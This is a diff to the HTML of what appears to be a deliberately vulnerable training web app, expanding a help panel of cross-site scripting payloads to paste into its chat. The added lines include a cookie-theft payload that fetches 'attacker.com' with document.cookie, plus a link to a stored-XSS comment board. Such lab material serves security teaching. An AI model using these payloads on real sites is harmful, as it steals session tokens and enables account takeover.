@@ -194,12 +194,20 @@ debugAPI.deleteMessage(1)</pre>
               <details class="mt-3">
                 <summary class="fw-bold">4. XSS 🎭</summary>
                 <div class="mt-2">
-                  <p class="small">Send these in the chat:</p>
+                  <p class="small"><strong>Basic XSS (Proof of Concept):</strong></p>
                   <ul class="small">
-                    <li>&lt;script&gt;alert('XSS')&lt;/script&gt;</li>
-                    <li>&lt;img src=x onerror=alert(1)&gt;</li>
-                    <li>&lt;svg/onload=alert('XSS')&gt;</li>
+                    <li>&lt;img src=x onerror=alert('XSS')&gt;</li>
+                    <li>&lt;svg onload=alert('XSS')&gt;</li>
+                    <li>&lt;iframe src="javascript:alert('XSS')"&gt;</li>
                   </ul>
+                  <p class="small"><strong>Advanced XSS (Cookie/Token Theft):</strong></p>
+                  <ul class="small">
+                    <li>&lt;img src=x onerror="alert('Cookie: ' + document.cookie)"&gt;</li>
+                    <li>&lt;img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)"&gt;</li>
+                    <li>&lt;img src=x onerror="console.log('Stolen:', document.cookie)"&gt;</li>
+                  </ul>
+                  <p class="small text-danger">⚠️ Real Attack: These payloads can steal session tokens and send them to an attacker!</p>
+                  <p class="small text-warning">💡 Note: &lt;script&gt; tags don't work with innerHTML in modern browsers!</p>
                 </div>
               </details>
               
@@ -246,9 +254,15 @@ debugAPI.deleteMessage(1)</pre>
               <button class="btn btn-sm btn-outline-primary w-100 mb-2" onclick="loadMessages()">
                 🔄 Reload Messages
               </button>
-              <button class="btn btn-sm btn-outline-secondary w-100" onclick="window.open('/api/users', '_blank')">
+              <button class="btn btn-sm btn-outline-warning w-100 mb-2" onclick="clearChatHistory()">
+                🗑️ Clear Chat History
+              </button>
+              <button class="btn btn-sm btn-outline-secondary w-100 mb-2" onclick="window.open('/api/users', '_blank')">
                 👥 View All Users (API)
               </button>
+              <a href="comments.html" class="btn btn-sm btn-outline-danger w-100 mb-2">
+                💬 Public Comment Board (STORED XSS!)
+              </a>
               <div class="mt-3">
                 <small class="text-muted">
                   <strong>Console Commands:</strong><br>
